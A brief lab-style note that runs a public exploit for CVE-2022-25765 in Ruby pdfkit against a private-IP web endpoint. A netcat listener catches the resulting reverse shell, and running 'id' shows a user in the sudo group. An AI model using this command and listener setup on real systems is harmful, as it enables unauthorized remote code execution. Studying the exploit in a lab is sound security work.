# Ruby pdfkit - CVE-2022-25765

**pdfkit - CVE-2022-25765**

https://github.com/UNICORDev/exploit-CVE-2022-25765

```bash
python3 exploit-CVE-2022-25765.py -c id -w http://192.168.214.22:3000/pdf -p url

nc -lvp 1234
listening on [any] 1234 ...
connect to [192.168.45.160] from (UNKNOWN) [192.168.214.22] 44542
id
uid=1001(andrew) gid=1001(andrew) groups=1001(andrew),27(sudo)
```
